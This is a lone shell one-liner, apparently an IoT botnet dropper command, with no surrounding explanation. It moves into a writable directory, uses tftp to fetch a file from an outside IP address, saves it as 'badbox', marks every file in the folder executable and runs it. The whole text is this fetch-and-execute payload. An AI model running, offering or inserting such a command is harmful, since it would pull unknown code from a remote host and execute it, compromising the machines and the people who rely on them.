cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 78.129.171.131 -c get bash;cat bash >badbox;chmod +x *;./badbox
